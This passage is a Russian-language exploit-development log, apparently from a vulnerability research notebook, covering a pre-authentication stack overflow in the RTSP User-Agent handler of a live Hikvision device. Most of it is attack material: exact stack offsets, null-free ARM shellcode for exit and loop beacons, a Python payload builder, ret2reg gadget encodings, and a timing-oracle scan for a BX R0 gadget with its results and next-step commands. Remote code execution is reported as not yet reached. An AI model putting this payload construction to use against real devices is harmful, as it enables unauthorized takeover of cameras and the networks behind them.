BX  R0 = \x10\xff\x2f\xe1   (null-free ✓)
BLX R0 = \x30\xff\x2f\xe1   (null-free ✓)
MOV PC, R0 = \x00\xf0\xa0\xe1  (byte[0]=0x00 → null! ✗ нельзя в адрес)
```

Адрес гаджета `BX R0` должен быть null-free в little-endian кодировке.

### Oracle для BX R0 сканирования

С LOOP-beacon (`B .` = бесконечный цикл) в ua_buf:
- PC → BX R0 гаджет → R0 = ua_buf → LOOP крутится → процесс **живёт** → watchdog не тригерится → **DEAD (нет рестарта >20s)**
- PC → не-гаджет → код исполняется, крашится → watchdog restart → **HIT (~2.5s)**

Это чистый binary оракул: одно значение = DEAD, всё остальное = HIT.

### Null-byte-free exit(0) shellcode (первая попытка beacon)

Сначала попробовал exit(0) вместо loop — для более быстрого детектирования (если exit(0) даёт быстрый рестарт < 3s, а crash = 9.7s, это хороший разрыв):

```python
# ПРОБЛЕМА: MOV R0, #0 = \x00\x00\xa0\xe3 — нулевые байты!
# РЕШЕНИЕ: R0 = R7 >> 30  (1 >> 30 = 0, нет нулей в кодировке)
EXIT_SC = (
    b'\x01\x70\xa0\xe3'   # MOV R7, #1       (R7 = __NR_exit = 1)
    b'\x27\x0f\xa0\xe1'   # MOV R0, R7, LSR#30  (R0 = 1 >> 30 = 0)
    b'\x01\x01\x01\xef'   # SVC #0x010101    (EABI: R7 определяет syscall)
)
assert 0 not in EXIT_SC  # ✓
```

Тест baseline с exit(0): отправил payload с EXIT_SC в ua_buf и `0x40111104` как PC (произвольный адрес, заведомо не BX R0 гаджет). Ожидал HIT (~9.7s). Получил **DEAD (21.2s)**.

---

## День 11. Баг: R11 в user-space → ложный DEAD

### FP-каскад через user-space R11

Это заняло время на отладку. Симптом: ВСЕ 108 пробов давали одинаковый 21.2s DEAD — даже baseline, который должен давать HIT.

Анализ: после `POP {R4-R11, PC}` из нашего payload'а:
- R4–R11 = байты 216–247 из User-Agent
- Эти байты мы заполняли `b'B' * 114 + b'C' * 32`
- R11 = 0x43434343 ('C' × 4, little-endian)
- 0x43434343 < 0xBFFFFFFF → **user-space адрес**

Когда исполнялся код по адресу `addr` (любому), этот код использовал R11 как frame pointer. При попытке вернуться: загружал saved регистры из [R11 - offset] = из области вокруг 0x43434343. Поскольку всё user-space mapped на этом устройстве, код там был, каскад шёл дальше. До ядра — долго. Итог: ~21s медленный crash вместо быстрого 2.5s.

### Попытка 1: заменить 'C'×32 на NOP sled

```python
# Было:
corrupt = b'B' * 114 + b'C' * 32

# Попытка 1:
corrupt = ARM_NOP * 36 + b'\x01\x01'   # 146 байт
```

Не помогло. Почему: NOP sled начинается с позиции 102 в payload'е (не выровнен на 4 байта относительно ARM_NOP). Байты 216–247 (R4–R11) попадают на смещение 114 внутри NOP sled, и из-за смещения LE-слово R11 = `0x0101e1a0` — **снова user-space** (0x01 < 0xC0000000). Каскад не прерывался.

### Фикс: ARM_NOP × 8 явно на позицию R4–R11

```python
def make_payload(addr):
    locals_fill = b'\x42' * 114          # locals — не важно что
    reg_fill    = ARM_NOP * 8            # R4–R11 = 0xe1a01001 каждый
    # ARM_NOP = b'\x01\x10\xa0\xe1' → LE = 0xe1a01001 > 0xBFFFFFFF = kernel space!
    corrupt = locals_fill + reg_fill      # 146 байт
    base    = LOOP_SC + corrupt           # 248 байт
    return base + struct.pack('<I', addr)
```

`0xe1a01001 > 0xBFFFFFFF` → kernel-space → обращение к [0xe1a01001 - N] немедленно вызывает fault → быстрый crash → 2.5s HIT. Каскад прерывается в первом же кадре.

**Результат после фикса**:
```
Baseline 0x40111104 → HIT (2.5s)  ✓
```

Oracle работает. 2.5s < 20s (DEAD threshold). Разрыв достаточный.

---

## День 12. BX R0 скан: 108 пробов — всё HIT

### Конфигурация скана

```python
# gen_candidates(step=0x8005): 108 адресов в 0x40200000–0x40F30000
# Покрытие: ~126 КБ между пробами
# Время: ~2.5s на пробу × 108 = ~4.5 мин
```

### Полные результаты

```
[  1/108] 0x401a0104: 2.7s  [HIT]
[  2/108] 0x401c0118: 2.5s  [HIT]
...
[ 86/108] 0x40c607bc: 5.8s  [HIT]   ← единственное отклонение, всё равно HIT
...
[108/108] 0x40f20974: 2.7s  [HIT]

No DEAD after 108 probes.
```

Таймер невероятно стабилен: 2.5–2.7s на каждый проб. Это значит oracle работает чисто: каждый адрес даёт быстрый crash, ни один не вызвал loop.

### Почему не нашли

Простая математика: в 15 МБ mmap-региона с шагом 32 КБ мы протестировали 108 из ~3.75М 4-байтовых адресов — это **0.003% покрытия**. Если BX R0 встречается каждые 1–5 КБ, вероятность попадания при таком шаге ~25–50%.

Не нашли — не значит, что гаджетов нет. Нужно плотнее.

### Текущие ограничения

| Ограничение | Суть |
|---|---|
| Шаг 32 КБ | 108 пробов / 3.75М адресов = 0.003% покрытия |
| Только R0 | Если R0 ≠ ua_buf (другой вызов после strcpy) — вся ветка не работает |
| Нет прошивки | Без дизассемблера нельзя найти BX R0 напрямую |

---

## Итог сессии: где стоим

**Прогресс:**
- Точный стек-лейаут подтверждён (ua_buf=102, locals=114, R4-R11=32, PC=248)
- strcpy = null-free constraint на весь payload
- Ret2reg (BX R0) — методология отлажена, oracle работает (HIT=2.5s, DEAD=нет рестарта >20s)
- Payload отладили: ключ — R4-R11 обязаны быть kernel-space (ARM_NOP×8 = 0xe1a01001)
- 108 пробов с шагом 32KB = все HIT, BX R0 не найден

**Не сделано:**
- Дenser скан (step=0x1001 → ~815 пробов, ~34 мин)
- Расшифровка `digicap.dav` (ключ неизвестен)

**Следующий шаг:**
```python
# В rtsp_bxr0_scan.py:
candidates = gen_candidates(step=0x1001)
# → 938 кандидатов, ~156 мин, ~65–90% шанс найти BX R0
python3 -u rtsp_bxr0_scan.py 2>&1 | tee /tmp/bxr0_out.txt
```

---

## День 13. Плотный скан запущен и остановлен

Сменил шаг `0x8005` → `0x1001` (~4 KB). Предварительный расчёт: 938 null-free, 4-aligned кандидатов в регионе `0x40000000–0x40F30000`, примерно 156 минут при 10s/проб.

Baseline перед запуском: `0x40111104` → **HIT 2.8s** — oracle чист.

Успели пройти 9 пробов:

```
[  1/938] 0x40014014: 4.0s  [HIT]
[  2/938] 0x40018018: 5.8s  [HIT]
...
[  9/938] 0x4003c03c: 4.6s  [HIT]
```

Все HIT (~2–6s), никакого DEAD. Скан остановлен намеренно — исследование закрываем.

---

## Заключение

### Что было сделано

За 13 рабочих сессий прошли путь от неизвестного бинарника до полноценного исследования атакующей поверхности живого Hikvision-устройства.

| Этап | Результат |
|---|---|
| Анализ прошивки | `digicap.dav` — AES-256-ECB, ключ не найден. Формат заголовка восстановлен частично (HK20/HK30 magic). |
| Обнаружение уязвимости | Pre-auth stack overflow через RTSP `User-Agent`. Подтверждён через тайминг-оракул (HIT = crash). |
| Замер стека | `ua_buf=102`, `locals=114`, `R4-R11=32`, `PC_OFFSET=248`. Точно. Нет ASLR, нет NX, нет canary. |
| Null-free constraint | `strcpy` останавливается на `0x00` → весь payload, включая адрес возврата, обязан быть null-free. |
| Ret2reg (BX R0) | Методология разработана, payload собран, oracle отлажен. Гаджет не найден (покрытие ~1% региона). |
| Диагностика FP-каскада | Баг: R4-R11 = user-space → ложный DEAD ~21s. Фикс: `ARM_NOP×8 = 0xe1a01001` (kernel space → HIT 2.5s). |
| Сканирование гаджетов | 108 пробов (step=32KB), 9 пробов (step=4KB) — всё HIT. DEAD не наблюдался. |

### Что доказано

- **Уязвимость существует**: pre-auth stack overflow в обработчике `User-Agent` подтверждён на живом устройстве.
- **Контроль PC**: произвольный адрес возврата записывается без ограничений (кроме null-free).
- **Эксплуатируемая среда**: нет ни одного защитного механизма — ни ASLR, ни NX, ни stack canary.
- **Oracle работает**: тайминг-метод надёжно отличает crash (HIT, ~2–6s) от loop-шеллкода (DEAD, >20s).

### Что не доказано

- **RCE не подтверждён**: BX R0 гаджет в mmap-регионе не найден за время исследования.
- **R0 = ua_buf**: гипотеза не опровергнута, но и не верифицирована — нет прошивки для дизассемблера.
- **Shellcode execution**: loop-маяк (`B .`) ни разу не запустился (DEAD не наблюдался).

### Технический debt (если возобновить)

1. **Дenser скан**: `step=0x1001` → 938 кандидатов → ~156 мин → ~65–90% шанс найти BX R0.
2. **Другие регистры**: если R0 ≠ ua_buf — проверить R4 (байты 216-219 payload под контролем), R1, R2.
3. **Расшифровка прошивки**: AES-256-ECB, ключ ищется в libc, libssl или hardcoded в другом бинарнике устройства.
4. **BLX R4**: `\x30\xff\x2f\xe1` — альтернативный гаджет, R4=ua_buf гарантирован через reg_fill.

### Итог

Исследование достигло технического предела без прошивки: уязвимость найдена и размерена, exploit-методология отлажена, но финальный шаг (поиск гаджета для перехода в шеллкод) требует либо полного покрытия (~156 мин сканирования), либо дизассемблера расшифрованной прошивки. Все ключевые находки задокументированы в `RESEARCH.md`.

---

*Исследование завершено. Дата: 2026-05-26.*
